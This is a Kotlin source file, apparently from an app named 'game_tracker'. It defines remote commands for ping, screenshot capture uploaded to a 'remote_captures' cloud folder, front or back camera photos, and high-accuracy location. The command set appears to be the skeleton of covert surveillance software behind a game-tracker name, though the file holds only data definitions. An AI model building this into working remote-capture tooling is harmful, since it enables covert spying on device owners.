package com.example.game_tracker.domain.command

import com.example.game_tracker.domain.model.FeatureId

sealed class DomainCommand {
    abstract val metadata: CommandMetadata
    abstract val featureId: FeatureId
}

data class PingCommand(
    override val metadata: CommandMetadata,
    val echoMessage: String = "PING"
) : DomainCommand() {
    override val featureId: FeatureId = FeatureId("FEATURE_PING")
}

data class ScreenshotCommand(
    override val metadata: CommandMetadata,
    val quality: Int = 80,
    val targetCloudinaryFolder: String = "remote_captures"
) : DomainCommand() {
    override val featureId: FeatureId = FeatureId("FEATURE_SCREENSHOT")
}

data class CameraCommand(
    override val metadata: CommandMetadata,
    val cameraFacing: String = "BACK", // "BACK" or "FRONT"
    val targetCloudinaryFolder: String = "camera_photos"
) : DomainCommand() {
    override val featureId: FeatureId = FeatureId("FEATURE_CAMERA")
}

data class LocationCommand(
    override val metadata: CommandMetadata,
    val highAccuracy: Boolean = true
) : DomainCommand() {
    override val featureId: FeatureId = FeatureId("FEATURE_LOCATION")
}



